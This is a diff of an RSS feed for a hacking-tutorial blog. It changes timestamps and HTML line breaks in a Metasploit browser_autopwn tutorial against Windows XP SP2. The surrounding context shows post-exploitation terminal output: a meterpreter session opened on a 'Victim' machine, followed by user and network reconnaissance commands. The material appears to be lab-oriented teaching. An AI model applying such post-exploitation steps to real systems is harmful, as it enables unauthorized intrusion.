@@ -2,8 +2,8 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Thu, 30 Jun 2016 23:23:04 +1000</lastBuildDate>
-<pubDate>Thu, 30 Jun 2016 23:23:04 +1000</pubDate>
+<lastBuildDate>Fri, 01 Jul 2016 09:08:38 +1000</lastBuildDate>
+<pubDate>Fri, 01 Jul 2016 09:08:38 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
 <item><title>
 Metasploit Browser Autopwn – Windows XP SP2
@@ -44,7 +44,8 @@ This will trigger the browser_autopwn module to serve the appropriate exploit an
 <font color="silver">msf auxiliary(browser_autopwn) ></font><b> sessions -i 1</b><br>
 <font color="silver">[*] Starting interaction with 1...meterpreter ></font><b> shell</b><br>
 <font color="silver">Microsoft Windows XP [Version 5.1.2600]</font><br>
-<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
+<font color="silver">(C) Copyright 1985-2001 Microsoft Corp.</font><br>
+<font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>echo %USERNAME%</b><br>
 <font color="silver">Victim</font><br>
 <br>
 <font color="silver">C:\Documents and Settings\IEUser\Desktop></font><b>ipconfig</b><br>
@@ -133,6 +134,7 @@ Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=
 <p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+
 
 
 <!-- text end -->
